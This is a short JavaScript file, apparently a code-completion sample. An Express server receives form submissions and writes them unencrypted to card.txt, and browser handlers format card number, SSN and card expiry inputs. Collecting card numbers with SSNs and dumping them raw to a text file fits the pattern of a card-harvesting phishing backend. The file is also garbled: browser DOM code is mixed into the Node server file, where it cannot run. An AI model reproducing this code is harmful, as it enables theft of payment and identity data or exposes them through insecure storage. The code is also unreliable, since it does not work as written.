/* Change the code above to a node server */
// Path: server.js
const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const port = 9000;
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static("public"));
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});
app.post("/submit", (req, res) => {
  console.log(req.body);
  fs.writeFile("card.txt", JSON.stringify(req.body), (err) => {
    if (err) throw err;
    console.log("The file has been saved!");
  });
  res.sendFile(path.join(__dirname, "confirmation.html"));
});
app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});

const cardNumberInput = document.getElementById("cardNumber");

cardNumberInput.addEventListener("input", (event) => {
  const input = event.target.value.replace(/\D/g, ""); // Remove non-numeric characters
  const groups = input.match(/\d{1,4}/g); // Split input into groups of up to 4 digits

  if (groups) {
    const formatted = groups.join("-");
    event.target.value = formatted;
  }
});

const ssnInput = document.getElementById("ssn");

ssnInput.addEventListener("input", (event) => {
  const input = event.target.value.replace(/\D/g, ""); // Remove non-numeric characters
  const groups = input.match(/^(\d{0,3})(\d{0,2})(\d{0,4})$/); // Split input into groups of up to 3, 2, and 4 digits

  if (groups) {
    const formatted = `${groups[1]}${groups[1] && groups[2] ? "-" : ""}${
      groups[2]
    }${groups[2] && groups[3] ? "-" : ""}${groups[3]}`; // Add hyphens between groups
    event.target.value = formatted;
  }
});

const cardExpiryInput = document.getElementById("cardExpiry");

cardExpiryInput.addEventListener("input", (event) => {
  const input = event.target.value.replace(/\D/g, ""); // Remove non-numeric characters
  const groups = input.match(/^(\d{0,2})(\d{0,2})$/); // Split input into groups of up to 2 digits

  if (groups) {
    const formatted = `${groups[1]}${groups[1] && groups[2] ? "/" : ""}${
      groups[2]
    }`; // Add slash between groups
    event.target.value = formatted;
  }
});
